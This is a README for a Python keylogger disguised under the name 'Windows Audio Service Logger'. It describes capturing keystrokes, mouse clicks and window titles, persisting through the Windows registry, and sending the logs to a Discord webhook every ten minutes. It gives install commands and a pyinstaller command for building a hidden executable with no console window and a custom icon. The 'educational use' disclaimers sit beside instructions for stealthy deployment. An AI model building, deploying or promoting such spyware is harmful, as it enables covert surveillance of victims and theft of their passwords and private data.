
# Windows Audio Service Logger

This is a stealthy logging tool written in Python, designed for educational and ethical testing purposes only.

## Features

- Keystroke logging (via `pynput`)
- Mouse click logging
- Active window title tracking
- Log auto-saving to a file every minute
- Auto-send logs to a Discord webhook every 10 minutes
- Auto-start on Windows boot (via Windows registry)
- Graceful shutdown with log dispatch (CTRL+C, window close, shutdown)

## Installation

> **Warning**: This tool is for **educational and authorized testing only**. Unauthorized use may violate laws or terms of service.

### Requirements

- Python 3.8+
- Windows or Linux -> only python for linux
- Required libraries:

```bash
pip install pynput pygetwindow requests
```

### Setup

1. Clone the repository or download the script.
2. Replace the webhook URL with your own Discord webhook:

```
webhook_url = "https://discord.com/api/webhooks/your_webhook_id"
```

3. Optionally, compile it to a standalone executable (with no console window and custom icon):

```bash
pyinstaller --noconsole --onefile --icon=youricon.ico script.py
```

4. Run the program. It will automatically log data and send logs to the specified Discord webhook.

## Disclaimer

This software is provided for **educational purposes** only. The author is **not responsible for any misuse** of this tool.
Always get proper authorization before running any monitoring software on devices you do not own.

